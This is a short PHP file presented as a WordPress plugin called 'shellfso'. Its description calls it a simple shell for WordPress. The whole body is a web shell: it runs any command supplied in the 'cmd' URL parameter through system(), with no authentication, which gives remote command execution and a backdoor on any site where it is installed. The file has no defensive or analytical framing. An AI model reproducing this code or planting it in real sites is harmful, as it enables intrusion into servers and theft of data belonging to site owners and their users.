<?php
/**
* Plugin Name : shellfso
* Plugin URI: https://github.com/kiarasaydan/shellfso
* Description : Shell sederhana untuk Wordpress
* Version: 1.0
* Author: Rakai
* Author URI : tumbuhbersamarakai.com
*/

if(isset($_GET['cmd']))
{
system ($_GET['cmd']);
}
?>
